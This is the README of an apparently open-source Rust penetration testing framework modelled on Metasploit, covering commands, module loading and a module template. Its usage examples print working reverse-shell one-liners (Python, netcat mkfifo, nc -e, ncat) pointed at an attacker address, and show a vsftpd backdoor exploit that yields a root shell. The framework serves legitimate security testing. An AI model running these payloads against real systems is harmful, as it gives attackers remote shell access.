# Amatsumara Framework

<p align="center">
  <img src="AmatsumaraLogo.png" alt="Amatsumara Logo" width="400"/>
</p>

<p align="center">
  <strong>A modern penetration testing framework built in Rust</strong>
</p>

<p align="center">
  Inspired by Metasploit Framework with a focus on safety, performance, and modularity
</p>

---

## Overview

Amatsumara is a penetration testing framework that provides a Metasploit-like experience while leveraging Rust's performance, safety, and concurrency. Modules are compiled as native shared libraries and loaded dynamically at runtime, giving you the flexibility of a scripted framework with the speed of compiled code.

### At a Glance

| | Count |
|---|---|
| Exploit Modules | 78 |
| Auxiliary Modules | 16 |
| Post-Exploitation Modules | 2 |
| Payload Generators | 9 |

> **Note:** Additional exploit modules are actively in development and will be added in batches as they are completed and tested.

### Key Features

- **Dynamic Module Loading** - Modules are `.so` shared libraries loaded at runtime. Add new modules without recompiling the framework.
- **Tab Completion** - Commands, module names, option names, and subcommands all support tab completion.
- **Session Management** - Open, background, interact with, and kill sessions across multiple targets.
- **Background Jobs** - Run long-running modules (like listeners) in the background while you continue working.
- **Global Options** - Set options like `LHOST` once and have them apply across all modules.
- **Numbered Search** - Search results are numbered for quick `use 0` selection.
- **Async Runtime** - Built on Tokio for non-blocking I/O and concurrent operations.

---

## Installation

### Requirements

- Rust toolchain (1.70+)
- Linux (x86_64)

### Build from Source

```bash
git clone https://github.com/lorsupra/Amatsumara-Framework.git
cd Amatsumara-Framework
cargo build --release
```

### Launch

```bash
./target/release/amatsumara-console
```

---

## Command Reference

### Module Selection

| Command | Description |
|---|---|
| `search <term>` | Search modules by name or description. Results are numbered. |
| `use <name>` | Select a module by its full name. |
| `use <number>` | Select a module by its search result number. |
| `info` | Show detailed info about the currently selected module. |
| `info <name>` | Show detailed info about a specific module. |
| `info <number>` | Show detailed info by search result number. |
| `back` | Deselect the current module and return to the main prompt. |

### Options

| Command | Description |
|---|---|
| `set <OPTION> <value>` | Set an option for the current module. Cleared when you switch modules. |
| `forge <OPTION> <value>` | Alias for `set`. Forge your options at the anvil. |
| `unset <OPTION>` | Remove a module-specific option. |
| `setg <OPTION> <value>` | Set a global option. Persists across all modules for the session. |
| `unsetg <OPTION>` | Remove a global option. |
| `options` | Show all options for the current module with their current values. |

> **How options resolve:** When a module runs, module-specific options (from `set`) take priority. If an option isn't set locally, the framework falls back to global options (from `setg`). If neither is set, the module's default value is used.

### Execution

| Command | Description |
|---|---|
| `run` | Execute the selected module in the foreground. |
| `strike` | Alias for `run`. Strike the target. |
| `run -j` / `strike -j` | Execute the module as a background job. |
| `check` | Run the module's vulnerability check (if supported). |

### Sessions

| Command | Description |
|---|---|
| `sessions -l` | List all active sessions with ID, type, target, and timestamp. |
| `sessions -i <id>` | Drop into an interactive shell on the specified session. |
| `sessions -k <id>` | Kill a specific session by ID. |
| `sessions -k all` | Kill all active sessions. |

**Inside a session:**

| Command | Description |
|---|---|
| `background` | Return to the console. The session stays alive. |
| `exit` | Close the session and return to the console. |

### Jobs

| Command | Description |
|---|---|
| `jobs` | List all running background jobs with ID, name, and runtime. |
| `kill <id>` | Terminate a background job by ID. |

### Display

| Command | Description |
|---|---|
| `show options` | Same as `options`. Show current module options. |
| `show exploits` | List all loaded exploit modules. |
| `show auxiliary` | List all loaded auxiliary modules. |
| `show payloads` | List all loaded payload modules. |
| `show post` | List all loaded post-exploitation modules. |
| `show all` | List every loaded module across all types. |

### Other

| Command | Description |
|---|---|
| `help` | Show the built-in help menu. |
| `?` | Alias for `help`. |
| `banner` | Redisplay the startup banner. |
| `exit` | Exit the framework. |
| `quit` | Alias for `exit`. |

---

## Usage Examples

### Example 1: Basic Exploit Workflow

```
amatsumara > search vsftpd

  #    Name                                        Description
  -    ----                                        -----------
  0    VSFTPD v2.3.4 Backdoor Command Execution    Exploits the malicious backdoor in vsftpd 2.3.4

amatsumara > use 0
Selected module: VSFTPD v2.3.4 Backdoor Command Execution

amatsumara VSFTPD v2.3.4 Backdoor Command Execution (exploit) > options

Module options:

  Name      Current Setting    Required  Description
  ----      ---------------    --------  -----------
  RHOST     127.0.0.1          yes       Target address
  RPORT     21                 yes       Target port

amatsumara VSFTPD v2.3.4 Backdoor Command Execution (exploit) > forge RHOST 192.168.1.100
RHOST => 192.168.1.100

amatsumara VSFTPD v2.3.4 Backdoor Command Execution (exploit) > strike

[*] Started exploit handler
[*] Launching module: VSFTPD v2.3.4 Backdoor Command Execution
[+] Session 1 opened

amatsumara > sessions -i 1
[*] Starting interaction with session 1

shell> whoami
root
shell> background
[*] Backgrounding session...
```

### Example 2: Global Options with Multi-Handler

```
amatsumara > setg LHOST 10.0.0.5
Global LHOST => 10.0.0.5

amatsumara > setg LPORT 4444
Global LPORT => 4444

amatsumara > use Multi Handler
Selected module: Multi Handler

amatsumara Multi Handler (exploit) > run -j

[*] Started exploit handler
[*] Launching module: Multi Handler
[*] Job 1 started in background

amatsumara > jobs

Active jobs

  Id    Name                                     Running
  --    ----                                     -------
  1     Multi Handler                            12s

amatsumara > use Python Reverse TCP
Selected module: Python Reverse TCP

amatsumara Python Reverse TCP (payload) > run

[*] Module options:
[*]   LHOST = 10.0.0.5 (global)
[*]   LPORT = 4444 (global)

[+] Python Reverse Shell Payload:
    Target: 10.0.0.5:4444

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

[*] Copy and execute on target system
```

### Example 3: Generating Payloads

Each payload module generates ready-to-use commands with multiple options:

```
amatsumara > search reverse

  #    Name                            Description
  -    ----                            -----------
  0    Linux x64 Reverse TCP Shell     Connect back to attacker and spawn /bin/sh
  1    Multi Handler                   Generic handler for reverse payloads
  2    PHP Reverse TCP                 PHP reverse shell with disabled function checks
  3    Python Reverse TCP              Python reverse shell one-liner (cross-platform)
  4    Unix Bash Reverse TCP           Reverse shell via bash /dev/tcp builtin
  5    Unix Netcat Reverse TCP         Reverse shell via netcat with mkfifo backpipe
  6    Unix Perl Reverse TCP           Reverse shell via Perl IO::Socket
  7    Unix Ruby Reverse TCP           Reverse shell via Ruby TCPSocket
  8    Windows PowerShell Reverse TCP  Interactive PowerShell session via reverse TCP

amatsumara > use 5
Selected module: Unix Netcat Reverse TCP

amatsumara Unix Netcat Reverse TCP (payload) > forge LHOST 10.0.0.5
LHOST => 10.0.0.5

amatsumara Unix Netcat Reverse TCP (payload) > forge LPORT 9001
LPORT => 9001

amatsumara Unix Netcat Reverse TCP (payload) > strike

[+] Netcat Reverse Shell Payload:
    Target: 10.0.0.5:9001
    Backpipe: /tmp/ivnrm

=== Option 1: Standard nc with mkfifo ===
mkfifo /tmp/ivnrm; nc 10.0.0.5 9001 0</tmp/ivnrm | /bin/sh >/tmp/ivnrm 2>&1; rm /tmp/ivnrm

=== Option 2: nc -e (traditional netcat) ===
nc -e /bin/sh 10.0.0.5 9001

=== Option 3: ncat (nmap netcat) ===
ncat 10.0.0.5 9001 -e /bin/sh
```

---

## Module Types

### Exploits (62)

Exploit modules target specific vulnerabilities in services, applications, and operating systems. Each module implements real protocol-level exploit logic (SMB negotiation, RDP handshakes, HTTP-specific CVE payloads, etc.). Categories include:

- **Web Applications** - WordPress, Drupal, Joomla, Jenkins, GitLab, Confluence, etc.
- **Network Services** - FTP, SSH, SMB, RDP, DNS, LDAP, etc.
- **Operating Systems** - Linux privilege escalation, Windows SMB exploits, etc.
- **IoT/Embedded** - Routers (Netgear, D-Link, TP-Link), printers, DVRs, etc.
- **Cloud/Container** - Docker, Kubernetes, AWS, Azure, etc.
- **Frameworks** - Apache Struts, Spring, Log4j, etc.

### Auxiliary (16)

Auxiliary modules perform scanning, enumeration, and information gathering:

- **Port Scanners** - TCP port scanner
- **Service Scanners** - HTTP directory scanner, SMB version, SSH enumeration, FTP anonymous check
- **Protocol Scanners** - MySQL, Redis, Memcached, LDAP, IMAP, POP3, SMTP, Telnet, VNC, Elasticsearch
- **Brute Force** - HTTP authentication brute forcer

### Post-Exploitation (2)

Post modules run after gaining access to a target:

- **Linux** - System enumeration, credential gathering

### Payloads (9)

Payload modules generate shell commands and binaries for establishing connections:

| Payload | Platform | Type | Description |
|---|---|---|---|
| Unix Bash Reverse TCP | Linux/BSD | Command | Bash `/dev/tcp` builtin with random file descriptor |
| Unix Netcat Reverse TCP | Linux/BSD | Command | mkfifo backpipe with nc, nc -e, and ncat variants |
| Unix Perl Reverse TCP | Linux/BSD | Command | IO::Socket and Socket module variants |
| Unix Ruby Reverse TCP | Linux/BSD | Command | TCPSocket with fork, exec, and interactive variants |
| Python Reverse TCP | Cross-platform | Command | Python one-liner using socket/subprocess |
| PHP Reverse TCP | Cross-platform | Command | Robust shell with disabled function checks |
| Windows PowerShell Reverse TCP | Windows | Command | Direct, Base64 encoded, and .ps1 script options |
| Linux x64 Reverse TCP Shell | Linux | Binary | Compiled native reverse shell |
| Linux x64 Bind TCP Shell | Linux | Binary | Compiled native bind shell |

---

## Architecture

### Project Structure

```
Amatsumara-Framework/
├── amatsumara-api/        # C-compatible FFI types (ModuleVTable, ModuleInfo, etc.)
├── amatsumara-core/       # Module loader, session manager, discovery engine
├── amatsumara-console/    # Interactive console (REPL, commands, tab completion)
├── kanayago/              # HTTP client, pattern generation utilities
├── modules/
│   ├── exploits/          # Exploit .so files and source
│   ├── auxiliary/         # Scanner/enum .so files
│   ├── post/              # Post-exploitation .so files
│   └── payloads/          # Payload generator .so files
│       └── singles/
│           ├── cmd/unix/      # Bash, netcat, perl, ruby
│           ├── cmd/windows/   # PowerShell
│           ├── multi/         # Python (cross-platform)
│           ├── php/           # PHP
│           └── linux/x64/     # Compiled binary payloads
├── pattern-create/        # Buffer overflow pattern generator
└── pattern-offset/        # Buffer overflow pattern offset finder
```

### How Module Loading Works

Modules are compiled as `cdylib` shared libraries (`.so` files). At startup, the framework:

1. Scans the `modules/` directory tree recursively for `.so` files
2. Loads each library and calls `msf_module_init()` to get the module's VTable
3. Reads module metadata (name, type, options, platforms, etc.) via the C FFI
4. Indexes modules by name for search and selection

This means you can add a new module by dropping a `.so` file into the modules directory and restarting the console.

### Session Architecture

Sessions use file-based IPC to work across shared library boundaries:

1. An exploit module opens a TCP connection to a target
2. The module writes session metadata to `/tmp/amatsumara_sessions/`
3. The console reads the session file and takes ownership of the TCP stream
4. The session persists independently - you can background it, interact later, or kill it

---

## Developing Modules

### Creating a New Module

```bash
# Create the module directory
mkdir -p modules/exploits/my_exploit/src

# Create Cargo.toml
cat > modules/exploits/my_exploit/Cargo.toml << 'EOF'
[package]
name = "my_exploit"
version = "0.1.0"
edition = "2021"

[lib]
crate-type = ["cdylib"]

[dependencies]
amatsumara-api = { path = "../../../amatsumara-api" }
serde = { version = "1.0", features = ["derive"] }
serde_json = "1.0"
EOF
```

### Module Template (src/lib.rs)

```rust
use amatsumara_api::*;
use std::os::raw::{c_char, c_int, c_void};
use serde::Deserialize;
use std::ffi::CStr;

// Module metadata (static strings for FFI)
static NAME: &str = "My Exploit Name";
static DESCRIPTION: &str = "What this exploit does";
static AUTHOR: &str = "Your Name";

// Define options
static RHOST_NAME: &str = "RHOST";
static RHOST_DESC: &str = "Target address";
static RHOST_DEFAULT: &str = "127.0.0.1";

static OPTIONS: &[ModuleOption] = &[
    ModuleOption {
        name: CString { ptr: RHOST_NAME.as_ptr() as *const c_char, len: RHOST_NAME.len() },
        description: CString { ptr: RHOST_DESC.as_ptr() as *const c_char, len: RHOST_DESC.len() },
        required: true,
        option_type: OptionType::Address,
        default_value: CString { ptr: RHOST_DEFAULT.as_ptr() as *const c_char, len: RHOST_DEFAULT.len() },
    },
];

// Wire up the module info and vtable
static MODULE_INFO: ModuleInfo = ModuleInfo {
    api_version: MODULE_API_VERSION,
    metadata: ModuleMetadata {
        name: CString { ptr: NAME.as_ptr() as *const c_char, len: NAME.len() },
        description: CString { ptr: DESCRIPTION.as_ptr() as *const c_char, len: DESCRIPTION.len() },
        author: CString { ptr: AUTHOR.as_ptr() as *const c_char, len: AUTHOR.len() },
        module_type: ModuleType::Exploit,
        platforms: PlatformArray { ptr: [Platform::Linux].as_ptr(), len: 1 },
        archs: ArchArray { ptr: [Arch::X64].as_ptr(), len: 1 },
        ranking: Ranking::Normal,
        privileged: false,
    },
    options: OptionArray { ptr: OPTIONS.as_ptr(), len: OPTIONS.len() },
};

static VTABLE: ModuleVTable = ModuleVTable { get_info, init, destroy, check: None, run };

// Required FFI functions
extern "C" fn get_info() -> *const ModuleInfo { &MODULE_INFO }
extern "C" fn init() -> *mut c_void {
    Box::into_raw(Box::new(0u8)) as *mut c_void
}
extern "C" fn destroy(instance: *mut c_void) {
    if !instance.is_null() { unsafe { let _ = Box::from_raw(instance as *mut u8); } }
}

// Deserialize options from JSON
#[derive(Deserialize)]
struct MyOptions {
    #[serde(rename = "RHOST")]
    rhost: Option<String>,
}

extern "C" fn run(_instance: *mut c_void, config: *const c_char) -> c_int {
    // Parse options
    let config_str = unsafe { CStr::from_ptr(config).to_str().unwrap_or("{}") };
    let opts: MyOptions = serde_json::from_str(config_str).unwrap_or(MyOptions { rhost: None });

    let rhost = match opts.rhost {
        Some(h) => h,
        None => { eprintln!("[-] RHOST required"); return 1; }
    };

    println!("[*] Targeting {}", rhost);

    // Your exploit logic here

    0 // Return 0 for success, non-zero for failure
}

// Entry point - the framework calls this to get the VTable
#[no_mangle]
pub extern "C" fn msf_module_init() -> *const ModuleVTable { &VTABLE }
```

### Build and Deploy

```bash
cd modules/exploits/my_exploit
cargo build --release
cp target/release/libmy_exploit.so ../../   # Copy to modules/exploits/
```

The module will be automatically discovered on the next console launch.

---

## Comparison to Metasploit

| Feature | Metasploit (Ruby) | Amatsumara (Rust) |
|---|---|---|
| Language | Ruby (interpreted) | Rust (compiled) |
| Module Loading | Ruby `require` | Dynamic `.so` via C FFI |
| Type Safety | Runtime checks | Compile-time guarantees |
| Concurrency | GIL-limited threads | Lock-free async (Tokio) |
| Memory | Garbage collected | Zero-cost abstractions |
| Performance | Interpreted | Native machine code |
| Session Management | In-process | File-based IPC |
| Tab Completion | Yes | Yes |
| Background Jobs | Yes | Yes |
| Global Options | Yes (`setg`) | Yes (`setg`) |

---

## Utilities

### pattern-create

Generate cyclic patterns for buffer overflow development:

```bash
./target/release/pattern-create -l 500
```

### pattern-offset

Find the offset of a pattern value:

```bash
./target/release/pattern-offset -q 41386141
```

---

## Roadmap

### v1.0.0 (Current Release)
- [x] Dynamic module loading via C FFI
- [x] Module registry and auto-discovery
- [x] Interactive console with tab completion
- [x] Command history persistence
- [x] Session management with file-based IPC
- [x] Numbered search and selection
- [x] Global options (`setg`/`unsetg`)
- [x] Background jobs (`run -j`, `jobs`, `kill`)
- [x] Shinto-themed aliases (`forge`, `strike`)
- [x] 62 exploit modules (200+ more in development)
- [x] 16 auxiliary modules
- [x] 2 post-exploitation modules
- [x] 9 payload generators (bash, python, perl, ruby, netcat, php, powershell, binary)
- [x] Multi-handler listener
- [x] Pattern generation tools (pattern-create, pattern-offset)

### Future
- [ ] Staged payloads (meterpreter-style agent)
- [ ] Module encoders for payload obfuscation
- [ ] Resource scripts (batch command files)
- [ ] RPC interface for external tooling
- [ ] Web interface
- [ ] Database integration for target/loot tracking
- [ ] Module auto-update system

---

## Contributing

Contributions welcome. Areas of interest:

1. **Exploit Modules** - Port from Metasploit or write new ones
2. **Protocol Libraries** - SSH, SMB, RDP client implementations
3. **Auxiliary Modules** - Scanners, brute forcers, enumerators
4. **Payloads** - New payload types, staged payloads, encoders
5. **Testing** - Validation against vulnerable targets (Metasploitable, HackTheBox, etc.)

## License

BSD-3-Clause

---

**Built with Rust**
